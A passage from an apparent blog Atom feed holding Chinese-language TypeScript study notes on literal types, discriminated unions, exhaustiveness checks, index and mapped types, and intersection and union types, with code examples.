      &lt;p&gt;&lt;code&gt;symbol&lt;/code&gt; 是 &lt;code&gt;ECMAScript 2015&lt;/code&gt; 提出的一种行的原生类型，就像 &lt;code&gt;number&lt;/code&gt; 和 &lt;code&gt;string&lt;/code&gt; 一样。实现了 &lt;code&gt;Symbol.iterator&lt;/code&gt; 方法就可以使用 &lt;code&gt;for-of&lt;/code&gt; 遍历。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Typescript学习日记(九)</title>
    <link href="https://github.com/TheNightElf/2017/03/02/Typescript%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B9%9D%EF%BC%89/"/>
    <id>https://github.com/TheNightElf/2017/03/02/Typescript学习日记（九）/</id>
    <published>2017-03-02T03:01:21.000Z</published>
    <updated>2018-01-25T06:18:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要介绍 <code>typescript</code> 几种高级类型及相关内容。<br><a id="more"></a></p><h3 id="字符串字面量类型"><a href="#字符串字面量类型" class="headerlink" title="字符串字面量类型"></a>字符串字面量类型</h3><p>字符串字面量类型允许你指定字符串必须的固定值。 在实际应用中，字符串字面量类型可以与联合类型，类型保护和类型别名很好的配合。</p><p>这里直接使用官方的例子：<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Easing = <span class="string">"ease-in"</span> | <span class="string">"ease-out"</span> | <span class="string">"ease-in-out"</span>; <span class="comment">// 使用 type 重命名 联合类型</span></span><br><span class="line"><span class="keyword">class</span> UIElement &#123;</span><br><span class="line">    animate(dx: <span class="built_in">number</span>, dy: <span class="built_in">number</span>, easing: Easing) &#123;</span><br><span class="line">        <span class="keyword">if</span> (easing === <span class="string">"ease-in"</span>) &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (easing === <span class="string">"ease-out"</span>) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (easing === <span class="string">"ease-in-out"</span>) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// error，没传 easing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> button = <span class="keyword">new</span> UIElement();</span><br><span class="line">button.animate(<span class="number">0</span>, <span class="number">0</span>, <span class="string">"ease-in"</span>);</span><br><span class="line">button.animate(<span class="number">0</span>, <span class="number">0</span>, <span class="string">"uneasy"</span>); <span class="comment">// error，没有 uneasy 类型</span></span><br></pre></td></tr></table></figure></p><p>字符串字面量类型还可以用于区分函数重载：<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function createElement(tagName: "img"): HTMLImageElement; // img 标签</span><br><span class="line">function createElement(tagName: "input"): HTMLInputElement; // input 标签</span><br><span class="line"><span class="comment">// ... </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createElement</span>(<span class="params">tagName: <span class="built_in">string</span></span>): <span class="title">Element</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ... </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="数字字面量类型"><a href="#数字字面量类型" class="headerlink" title="数字字面量类型"></a>数字字面量类型</h3><p>TypeScript还具有数字字面量类型。不过数字字面量类型很少使用，因为它不能像字符串字面量表达一个具有意义的值。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rollDie</span>(<span class="params"></span>): 1 | 2 | 3 | 4 | 5 | 6 </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="枚举成员类型"><a href="#枚举成员类型" class="headerlink" title="枚举成员类型"></a>枚举成员类型</h3><p>在我们谈及“单例类型”的时候，多数是指枚举成员类型和数字/字符串字面量类型，尽管大多数用户会互换使用“单例类型”和“字面量类型”。</p><h3 id="可辨识联合（Discriminated-Unions）"><a href="#可辨识联合（Discriminated-Unions）" class="headerlink" title="可辨识联合（Discriminated Unions）"></a>可辨识联合（Discriminated Unions）</h3><p>你可以合并 <code>单例类型</code>，<code>联合类型</code>，<code>类型保护</code> 和 <code>类型别名</code> 来创建一个叫做 <code>可辨识联合的高级模式</code>，它也称做 <code>标签联合</code> 或 <code>代数数据类型</code>。 可辨识联合在函数式编程很有用处。 一些语言会自动地为你辨识联合；而TypeScript则基于已有的JavaScript模式。 它具有3个要素：</p><ol><li>具有普通的单例类型属性— <code>可辨识的特征</code>。</li><li>一个类型别名包含了那些类型的联合— 联合。</li><li>此属性上的类型保护。</li></ol><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Square &#123;</span><br><span class="line">    kind: <span class="string">"square"</span>;</span><br><span class="line">    size: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> Rectangle &#123;</span><br><span class="line">    kind: <span class="string">"rectangle"</span>;</span><br><span class="line">    width: <span class="built_in">number</span>;</span><br><span class="line">    height: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> Circle &#123;</span><br><span class="line">    kind: <span class="string">"circle"</span>;</span><br><span class="line">    radius: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每个接口都有 <code>kind</code> 属性但有不同的字符串字面量类型。 <code>kind</code> 属性称做 <code>可辨识的特征</code> 或 <code>标签</code>。<br>将上面三个接口联合：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Shap = Square | Rectangle | Circle;</span><br></pre></td></tr></table></figure><p>使用可辨识联合：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">area</span>(<span class="params">s: Shape</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (s.kind) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"square"</span>: <span class="keyword">return</span> s.size * s.size;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"rectangle"</span>: <span class="keyword">return</span> s.height * s.width;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"circle"</span>: <span class="keyword">return</span> <span class="built_in">Math</span>.PI * s.radius ** <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现了吗？这种写法估计大家都不会陌生，只是为这种形式起了一个合理化的名字罢了。</p><h4 id="完整性检查"><a href="#完整性检查" class="headerlink" title="完整性检查"></a>完整性检查</h4><p>当没有涵盖所有可辨识联合的变化时，我们想让编译器可以通知我们。 比如，如果我们添加了 <code>Triangle</code> 到 <code>Shape</code>，我们同时还需要更新 <code>area</code>:</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Shap = Square | Rectangle | Circle | Triangle;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">area</span>(<span class="params">s: Shape</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (s.kind) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"square"</span>: <span class="keyword">return</span> s.size * s.size;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"rectangle"</span>: <span class="keyword">return</span> s.height * s.width;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"circle"</span>: <span class="keyword">return</span> <span class="built_in">Math</span>.PI * s.radius ** <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 这会出错，因为没有一个 Triangle 类型</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方法一：<br>使用 <code>--strictNullChecks</code> 并且指定一个返回值类型;</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">area</span>(<span class="params">s: Shape</span>): <span class="title">number</span> </span>&#123; <span class="comment">// error: returns number | undefined</span></span><br><span class="line">    <span class="keyword">switch</span> (s.kind) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"square"</span>: <span class="keyword">return</span> s.size * s.size;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"rectangle"</span>: <span class="keyword">return</span> s.height * s.width;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"circle"</span>: <span class="keyword">return</span> <span class="built_in">Math</span>.PI * s.radius ** <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为 <code>switch</code> 没有包涵所有情况，所以 <code>TypeScript</code> 认为这个函数有时候会返回 <code>undefined</code>。 如果你明确地指定了返回值类型为 <code>number</code>，那么你会看到一个错误，因为实际上返回值的类型为 <code>number | undefined</code>。</p><p>解决方法二：<br>使用 <code>never</code> 类型，编译器用它来进行完整性检查。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">assertNever</span>(<span class="params">x: never</span>): <span class="title">never</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Unexpected object: "</span> + x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">area</span>(<span class="params">s: Shape</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (s.kind) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"square"</span>: <span class="keyword">return</span> s.size * s.size;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"rectangle"</span>: <span class="keyword">return</span> s.height * s.width;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"circle"</span>: <span class="keyword">return</span> <span class="built_in">Math</span>.PI * s.radius ** <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">default</span>: <span class="keyword">return</span> assertNever(s); <span class="comment">// error，忘记的那个 case 类型将被 assertNever 标记为 never 类型，并抛出错误</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>assertNever</code> 检查 <code>s</code> 是否为 <code>never</code> 类型—-即为除去所有可能情况后剩下的类型。 如果你忘记了某个 <code>case</code>，那么 <code>s</code> 将具有一个真实的类型并且你会得到一个错误。</p><h3 id="多态的-this-类型"><a href="#多态的-this-类型" class="headerlink" title="多态的 this 类型"></a>多态的 this 类型</h3><p>不多解释。</p><h3 id="索引类型-Index-types"><a href="#索引类型-Index-types" class="headerlink" title="索引类型(Index types)"></a>索引类型(Index types)</h3><p>使用索引类型，编译器就能够检查使用了动态属性名的代码。 例如，一个常见的 <code>javaScript</code> 模式是从对象中选取属性的子集。</p><p>下面是如何在 <code>TypeScript</code> 里使用此函数，通过 <code>索引类型查询</code> 和 <code>索引访问</code> 操作符：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// keyof 索引类型查询操作符，类似与 javascript 中的 for in 遍历中的取 key 操作</span></span><br><span class="line"><span class="comment">// T[K] 索引访问操作符，T[K][] 这里表示 取值后的类型，就是返回的类型</span></span><br><span class="line"><span class="comment">// pluck(person, ['name']) -&gt; T[k][] -&gt; 'Jarid'[] -&gt; string[]</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pluck</span>&lt;<span class="title">T</span>, <span class="title">K</span> <span class="title">extends</span> <span class="title">keyof</span> <span class="title">T</span>&gt;(<span class="params">o: T, names: K[]</span>): <span class="title">T</span>[<span class="title">K</span>][] </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> names.map(<span class="function"><span class="params">n</span> =&gt;</span> o[n]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> Person &#123;</span><br><span class="line">    name: <span class="built_in">string</span>;</span><br><span class="line">    age: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> person: Person = &#123;</span><br><span class="line">    name: <span class="string">'Jarid'</span>,</span><br><span class="line">    age: <span class="number">35</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> strings: <span class="built_in">string</span>[] = pluck(person, [<span class="string">'name'</span>]);<span class="comment">// -&gt; return ['Jarid']</span></span><br></pre></td></tr></table></figure><p>编译器会检查 <code>name</code> 是否真的是 <code>Person</code> 的一个属性。 本例还引入了几个新的类型操作符。 首先是 <code>keyof T</code>， 索引类型查询操作符。 对于任何类型 <code>T</code>， <code>keyof T</code>的结果为 <code>T</code> 上已知的公共属性名的联合。例如：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> props: keyof Person;  </span><br><span class="line"><span class="comment">// -&gt; name | age</span></span><br><span class="line"><span class="comment">// keyof Person是完全可以与 'name' | 'age'互相替换的</span></span><br></pre></td></tr></table></figure><p>第二个操作符是 <code>T[K]</code>， 索引访问操作符。在这里，类型语法反映了表达式语法。 这意味着 <code>person[&#39;name&#39;]</code> 具有类型 <code>Person[&#39;name&#39;]</code> —- 在我们的例子里则为 <code>string</code> 类型。 然而，就像索引类型查询一样，你可以在普通的上下文里使用 <code>T[K]</code>，这正是它的强大所在。 你只要确保类型变量 <code>K extends keyof T</code> 就可以了。</p><h4 id="索引类型和字符串索引签名"><a href="#索引类型和字符串索引签名" class="headerlink" title="索引类型和字符串索引签名"></a>索引类型和字符串索引签名</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Map&lt;T&gt; &#123;</span><br><span class="line">    [key: <span class="built_in">string</span>]: T;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Map 是一个只包含一对键值的对象 key -&gt; string，value -&gt; T</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> keys: keyof Map&lt;<span class="built_in">number</span>&gt;; <span class="comment">// string</span></span><br><span class="line"><span class="keyword">let</span> value: Map&lt;<span class="built_in">number</span>&gt;[<span class="string">'foo'</span>]; <span class="comment">// number</span></span><br></pre></td></tr></table></figure><h3 id="映射类型"><a href="#映射类型" class="headerlink" title="映射类型"></a>映射类型</h3><p>通过 <code>映射类型</code> 将一个已知的类型每个属性都变为可选的/只读的。在映射类型里，新类型以相同的形式去转换旧类型里每个属性。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 转换成只读属性</span></span><br><span class="line"><span class="keyword">type</span> Readonly&lt;T&gt; = &#123;</span><br><span class="line">    readonly [P <span class="keyword">in</span> keyof T]: T[P];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转换成可选属性</span></span><br><span class="line"><span class="keyword">type</span> Partial&lt;T&gt; = &#123;</span><br><span class="line">    [P <span class="keyword">in</span> keyof T]?: T[P];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用方式：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> PersonPartial = Partial&lt;Person&gt;;</span><br><span class="line"><span class="keyword">type</span> ReadonlyPerson = Readonly&lt;Person&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设Person interface Person = &#123;age: number; gender: string; name: string&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Readonly&lt;T&gt; = &#123;</span><br><span class="line">    readonly [P <span class="keyword">in</span> keyof T]: T[P];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// T -&gt; Person</span></span><br><span class="line"><span class="comment">// P in keyof T -&gt; keyof T 指的是 Person 中所有的 key</span></span><br><span class="line"><span class="comment">// P in keyof T -&gt; P 为 age &amp; gender &amp; name</span></span><br><span class="line"><span class="comment">// T[P] 取值操作</span></span><br></pre></td></tr></table></figure><p>再看一个<code>包装属性</code>的例子：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Proxy&lt;T&gt; = &#123;</span><br><span class="line">    <span class="keyword">get</span>(): T;</span><br><span class="line">    <span class="keyword">set</span>(value: T): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Proxify&lt;T&gt; = &#123;</span><br><span class="line">    [P <span class="keyword">in</span> keyof T]: Proxy&lt;T[P]&gt;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">proxify</span>&lt;<span class="title">T</span>&gt;(<span class="params">o: T</span>): <span class="title">Proxify</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> proxyProps = proxify(props);</span><br></pre></td></tr></table></figure><p>是不是有种函数互相嵌套的感觉？</p><p><strong><code>Pick</code></strong><br>取出指定的属性。</p><p>定义：<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Pick&lt;T, K <span class="keyword">extends</span> keyof T&gt; = &#123;</span><br><span class="line">    [P <span class="keyword">in</span> K]: T[P];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们用上面的Person来使用：<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">type</span> PickPerson = Pick&lt;Person, <span class="string">'age'</span> | <span class="string">'name'</span>&gt;; <span class="comment">// -&gt; &#123;age: number; name: string&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// T: Person, K: 'age' | 'name',  T: 'age' | 'gender' | 'age', P: 'age' | 'name',</span></span><br><span class="line"><span class="comment">// [P in K] 遍历 K</span></span><br><span class="line"><span class="comment">// T[P] 取值</span></span><br></pre></td></tr></table></figure></p><p><strong><code>Record</code></strong><br>将传入的属性统一定义类型。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Record&lt;K <span class="keyword">extends</span> <span class="built_in">string</span>, T&gt; = &#123;</span><br><span class="line">    [P <span class="keyword">in</span> K]: T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> RecordPerson = Record&lt;<span class="string">'gender'</span> | <span class="string">'name'</span>, <span class="built_in">string</span>&gt;; <span class="comment">// -&gt; &#123;gender: string; name: string&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// K: 'gender' | 'name', T: string</span></span><br></pre></td></tr></table></figure><h4 id="由映射类型进行推断"><a href="#由映射类型进行推断" class="headerlink" title="由映射类型进行推断"></a>由映射类型进行推断</h4><p>上面是包装属性，下面看下如何拆包。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unproxify</span>&lt;<span class="title">T</span>&gt;(<span class="params">t: Proxify&lt;T&gt;</span>): <span class="title">T</span> </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> result = &#123;&#125; <span class="keyword">as</span> T;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> k <span class="keyword">in</span> t) &#123;</span><br><span class="line">        result[k] = t[k].get();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要介绍 &lt;code&gt;typescript&lt;/code&gt; 几种高级类型及相关内容。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Typescript学习日记（八）</title>
    <link href="https://github.com/TheNightElf/2017/02/23/Typescript%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%88%E5%85%AB%EF%BC%89/"/>
    <id>https://github.com/TheNightElf/2017/02/23/Typescript学习日记（八）/</id>
    <published>2017-02-23T09:41:17.000Z</published>
    <updated>2018-01-25T03:04:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要介绍 <code>typescript</code> 几种高级类型及相关内容。<br><a id="more"></a></p><h3 id="高级类型"><a href="#高级类型" class="headerlink" title="高级类型"></a>高级类型</h3><h4 id="交叉类型-Intersection-Types"><a href="#交叉类型-Intersection-Types" class="headerlink" title="交叉类型(Intersection Types)"></a>交叉类型(Intersection Types)</h4><p>交叉类型是将多个类型合并为一个类型。这让我们可以把现有的多种类型叠加到一起成为一种类型，它包含了所需的所有类型的特性。<br>我们大多是在混入（mixins）或其它不适合典型面向对象模型的地方看到交叉类型的使用。<br>简单的说：将多个类型进行并集操作，目标类型必须满足合并之后的所有类型。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加类型 T、U，指定返回值类型必须符合 T 且符合 U</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">extend</span>&lt;<span class="title">T</span>, <span class="title">U</span>&gt;(<span class="params">first: T, second: U</span>): <span class="title">T</span> &amp; <span class="title">U</span> </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> result = &lt;T &amp; U&gt;&#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> id <span class="keyword">in</span> first) &#123;</span><br><span class="line">        (&lt;<span class="built_in">any</span>&gt;result)[id] = (&lt;<span class="built_in">any</span>&gt;first)[id];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> id <span class="keyword">in</span> second) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!result.hasOwnProperty(id)) &#123;</span><br><span class="line">            (&lt;<span class="built_in">any</span>&gt;result)[id] = (&lt;<span class="built_in">any</span>&gt;second)[id];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Person &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"><span class="keyword">public</span> name: <span class="built_in">string</span></span>) &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> Loggable &#123;</span><br><span class="line">    log(): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> ConsoleLogger <span class="keyword">implements</span> Loggable &#123;</span><br><span class="line">    log() &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 混合 Person 类和 ConsoleLogger 类</span></span><br><span class="line"><span class="comment">// 生成的 jim 包含两个父类的所有属性和方法</span></span><br><span class="line"><span class="keyword">var</span> jim = extend(<span class="keyword">new</span> Person(<span class="string">"Jim"</span>), <span class="keyword">new</span> ConsoleLogger());</span><br><span class="line"><span class="keyword">var</span> n = jim.name;</span><br><span class="line">jim.log();</span><br></pre></td></tr></table></figure><h4 id="联合类型-Union-Types"><a href="#联合类型-Union-Types" class="headerlink" title="联合类型(Union Types)"></a>联合类型(Union Types)</h4><p>如果把 <code>交叉类型</code> 用 <code>&amp;</code> 符号标示，那么 <code>联合类型</code> 就是 <code>|</code>;<br>如果一个值是联合类型，<strong>我们只能访问此联合类型的所有类型里<code>共有的成员</code></strong>。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Bird &#123;</span><br><span class="line">    fly();</span><br><span class="line">    layEggs();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> Fish &#123;</span><br><span class="line">    swim();</span><br><span class="line">    layEggs();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSmallPet</span>(<span class="params"></span>): <span class="title">Fish</span> | <span class="title">Bird</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> pet = getSmallPet();</span><br><span class="line">pet.layEggs(); <span class="comment">// -&gt; success，Bird U Fish 求交集，共有成员为 layEggs</span></span><br><span class="line">pet.swim();    <span class="comment">// -&gt; error</span></span><br></pre></td></tr></table></figure><h4 id="类型保护与区分类型-Type-Guards-and-Differentiating-Types"><a href="#类型保护与区分类型-Type-Guards-and-Differentiating-Types" class="headerlink" title="类型保护与区分类型(Type Guards and Differentiating Types)"></a>类型保护与区分类型(Type Guards and Differentiating Types)</h4><h4 id="用户自定义的类型保护"><a href="#用户自定义的类型保护" class="headerlink" 